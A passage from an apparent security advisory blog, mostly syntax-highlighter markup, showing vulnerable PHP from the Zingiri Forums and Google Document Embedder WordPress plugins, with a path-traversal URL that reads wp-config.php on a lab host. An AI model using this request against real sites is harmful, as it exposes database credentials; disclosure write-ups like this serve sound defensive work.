data-line="crayon-53c98e78b71e7788138840-564">564</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-565">565</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-566">566</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-567">567</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-568">568</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-569">569</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-570">570</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-571">571</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-572">572</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-573">573</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b71e7788138840-574">574</div><div class="crayon-num" data-line="crayon-53c98e78b71e7788138840-575">575</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b71e7788138840-541"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">==</span><span class="crayon-s">'css'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-542"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_end_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-543"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-544"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">key</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-545"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-546"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-547"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-548"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-549"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">http</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_http</span><span class="crayon-sy">(</span><span class="crayon-s">"mybb"</span><span class="crayon-sy">,</span><span class="crayon-s">'css.php'</span><span class="crayon-sy">,</span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">news</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">zHttpRequest</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">http</span><span class="crayon-sy">,</span><span class="crayon-s">'zingiri-forum'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-551"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">curlInstalled</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"cURL not installed"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">live</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">"A HTTP Error occured"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-553"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">news</span><span class="crayon-o">-&gt;</span><span class="crayon-e">DownloadToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'url(images/'</span><span class="crayon-sy">,</span><span class="crayon-s">'url('</span><span class="crayon-sy">.</span><span class="crayon-v">ZING_MYBB_URL</span><span class="crayon-sy">.</span><span class="crayon-s">'/images/'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-555">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">elseif</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-557"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'url'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">ZING_MYBB_DIR</span><span class="crayon-sy">.</span><span class="crayon-s">'/cache/themes/'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/^body.*{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">' {$1'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-562"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/.zingbody/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-563"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-564"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-565"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'.ccforum $1 {$2'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-566"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-567"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,.ccforum $2 {$3'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-568"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'/(.*?),(.*?),(.*?).{(.*?)/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-569"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">'$1,$2,.ccforum $3 {$4'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-570"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">preg_replace</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">count</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-571"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ccforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">'stylesheet'</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">key</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-572"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-573"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: text/css"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b71e7788138840-574"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b71e7788138840-575"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0196 seconds] -->
<p>If we don&#8217;t set anything expect the &#8220;url&#8221; get variable, we can cause it to be fed into the file_get_contents call on line 554. We can abuse this to disclose the contents of the wp-config.php file like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b71f6779651130" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b71f6779651130-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b71f6779651130-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/zingiri-forums/" rel="tag">Zingiri Forums</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/#comments" title="Comment on WordPress Zingiri Forums arbitrary file disclosure">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-164 -->

				
					
<article id="post-167" class="post-167 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-google-document-embedder tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/" title="2:10 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-03T14:10:34+00:00" pubdate>January 3, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/" title="Permalink to WordPress Google Document Embedder arbitrary file disclosure" rel="bookmark">WordPress Google Document Embedder arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50832">Secunia Advisory SA50832</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>Google Document Embedder offers a proxy for forcing a PDF to download rather than use the default browser handler. It implements this through <a href="http://plugins.svn.wordpress.org/google-document-embedder/trunk/libs/pdf.php">/libs/pdf.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b7bee892530183" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if (ini_get('allow_url_fopen') !== "1") {
	if (function_exists('curl_version')) {
		$curl = 1;
	} else {
		$err = "This function is not supported on your web server. Please add ";
		$err .= "&lt;code&gt;allow_url_fopen = 1&lt;/code&gt; to your php.ini or enable cURL library. ";
		$err .= "If you are unable to do this, please change the Link Behavior setting to ";
		$err .= "Browser Default in GDE Options.";
		showErr($err);
		exit;
	}
}

if ((isset($_GET['fn'])) &amp;&amp; (isset($_GET['file']))) { 
	// check for invalid file type
	if (!preg_match("/\.pdf$/i",$_GET['fn'])) {
		showErr('Invalid file type; action cancelled.');
	}

	// ready file
	$file = urldecode($file);
	$fileParts = parse_url($file);
	if (preg_match("/^https/i", $fileParts['scheme'])) {
		$ssl = true;
	} else {
		$ssl = false;
	}

	// get file
	if ($curl) {
		$code = @curl_get_contents($_GET['file'], $ssl);  
	} else {
		$code = @file_get_contents($_GET['file']); 
	}

	// output file
	header('Content-type: application/pdf');
	header('Content-Disposition: attachment; filename="'.$_GET['fn'].'"');
	echo $code;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-8">8</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-9">9</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-10">10</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-11">11</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-12">12</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-13">13</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-14">14</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-15">15</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-16">16</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-17">17</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-18">18</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-19">19</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-20">20</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-21">21</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-22">22</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-23">23</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-24">24</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-25">25</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-26">26</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-27">27</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-28">28</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-29">29</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-30">30</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-31">31</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-32">32</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-33">33</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-34">34</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-35">35</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-36">36</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-37">37</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-38">38</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-39">39</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-40">40</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-41">41</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-42">42</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-43">43</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-44">44</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b7bee892530183-45">45</div><div class="crayon-num" data-line="crayon-53c98e78b7bee892530183-46">46</div></div>
				</td>
